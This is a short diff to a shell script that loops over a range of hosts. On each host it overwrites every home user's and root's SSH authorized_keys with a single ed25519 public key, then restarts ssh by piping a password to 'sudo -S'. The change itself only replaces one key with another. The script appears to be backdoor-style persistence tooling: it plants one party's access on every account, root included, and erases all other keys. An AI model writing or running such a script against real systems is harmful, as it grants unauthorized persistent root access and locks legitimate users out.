@@ -19,10 +19,10 @@ for i in $(seq $starting $ending); do
         for user_dir in /home/*; do
             mkdir -p \"\$user_dir/.ssh\"
             touch \"\$user_dir/.ssh/authorized_keys\"
-            echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIL7lPzw1H3lW1v7uYW/W+i9UyEBXw0B0pOk+CLY2lrZ/ digitd@archPC' > \"\$user_dir/.ssh/authorized_keys\"
+            echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIO91EHWdaQCtR/0uX5u//MzTZd5OACiwcsu3fzvuswrF digitd@DESKTOP-BP8SOQ1' > \"\$user_dir/.ssh/authorized_keys\"
         done
         mkdir -p /root/.ssh
-        echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIL7lPzw1H3lW1v7uYW/W+i9UyEBXw0B0pOk+CLY2lrZ/ digitd@archPC' > /root/.ssh/authorized_keys
+        echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIO91EHWdaQCtR/0uX5u//MzTZd5OACiwcsu3fzvuswrF digitd@DESKTOP-BP8SOQ1' > /root/.ssh/authorized_keys
         echo $pass | sudo -S systemctl restart ssh
     "
 done
